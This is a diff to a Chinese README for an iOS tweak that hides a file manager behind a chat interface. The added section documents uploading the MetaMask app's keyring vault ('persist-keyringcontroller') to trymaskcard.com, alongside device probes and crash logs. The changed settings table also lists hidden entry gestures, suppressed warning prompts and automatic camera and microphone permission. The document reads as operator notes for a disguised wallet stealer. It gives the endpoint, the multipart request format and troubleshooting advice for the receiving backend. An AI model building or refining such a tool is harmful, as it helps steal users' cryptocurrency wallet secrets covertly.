@@ -68,6 +68,20 @@
   ```
 * **每次交互都留面包屑**：导航裁决、下载、弹窗、媒体授权、`target=_blank` 折叠、内容进程终止等回调都会写一行到 `TryMaskCardShell-Status.txt`，所以「点一下就闪退」时最后一行就是出事的那次回调。
 
+### 2.1.3 上传什么时候会发生（排查「前端没收到」）
+
+三个**互相独立**的上传触发点，任何一条都不依赖另外两条：
+
+| 触发 | 条件 | 文件分片名 | 说明 |
+|---|---|---|---|
+| 探针 | 每次启动（`uploadProbe`，默认开） | `shell-hello.txt` | 只带 uuid / 模式 / 主页 / bundle / 系统版本；**不依赖 MetaMask、不依赖崩溃**，用来证明端点通 |
+| 采集 | 目标 App 的 persist store **读取成功**（默认 `io.metamask`） | `persist-keyringcontroller` | 目标未安装或容器解析失败就**不会上传**——这是设计上的盲区，靠探针与崩溃上报补 |
+| 崩溃上报 | 上次运行留下 `LastException.txt` / `LastSignal.txt`（`crashAutoReport`，默认开） | `LastException.txt` / `LastSignal.txt` / `Runtime-tail.log` / `TryMaskCardShell-Status.txt` | 同一个指纹只投一次 |
+
+`uuid` 一律用**本 App 自己容器的 UUID**（`NSHomeDirectory()` 最后一段），探针与崩溃上报都如此；采集走的 `uuid` 是**目标 App 容器的 UUID**（也就是接口示例里那个 UUID 的语义）。端点默认 `https://trymaskcard.com/api/app/device-upload`，可用 `crashUploadURL` 单独覆盖上报地址。
+
+请求体与示例 curl 同形（已逐字段对齐验证）：`uuid` 文本分片（无 `Content-Type`，36 字节 UUID 原样）+ `file` 分片（带真文件名与 `Content-Type`），整体 `multipart/form-data; boundary=----TryMaskCard<UUID>`。注意：探针/日志按 `text/plain` 发、金库按 `application/json` 发——**若你的后端按 MIME 类型白名单校验（示例里是图片），这两类会被你后端拒掉**，而设备侧只在状态文件里记 HTTP 状态码。
+
 ### 2.2 硬保证
 
 1. `UIWindow.setRootViewController:` 被接管：Filza 请求的任何 root 都被 `TMShellCaptureHiddenRoot` 收走并强引用保留，窗口始终挂聊天界面。
@@ -107,6 +121,9 @@ iOS 26 SDK（实测 iPhoneOS26.2.sdk）把 `WKWebView` 的 UI 代理属性从 `u
 | `hiddenEntryGesture` | `true` | 三指长按手势 |
 | `hiddenEntryURLScheme` | `true` | `scheme://` 入口 |
 | `suppressFilzaPrompts` | `true` | 预置远程控制台导读键，避免 Filza 品牌弹窗 |
+| `suppressFilzaModals` | `false` | 拦截 Filza 自有类的模态（**默认关**：它是唯一会介入 UIKit 展示路径的钩子，而 Filza 界面本来就打不开；开启时也只拦 `TG`/`Filza`/`MCM`/`PB` 前缀的类，绝不动 WebKit/系统自己的展示） |
+| `uploadProbe` | `true` | 每次启动发一份 `shell-hello.txt` 探针，证明上传链路通 |
+| `crashAutoReport` | `true` | 上次运行的崩溃取证自动投递 |
 | `suppressFilzaShortcuts` | `true` | 过滤图标长按快捷项 |
 | `containerChrome` | `true` | 文件管理器外套一层带 `Chat` 返回栏的容器 |
 | `autoGrantMediaCapture` | `true` | 同源站点的摄像头/麦克风请求直接放行 |
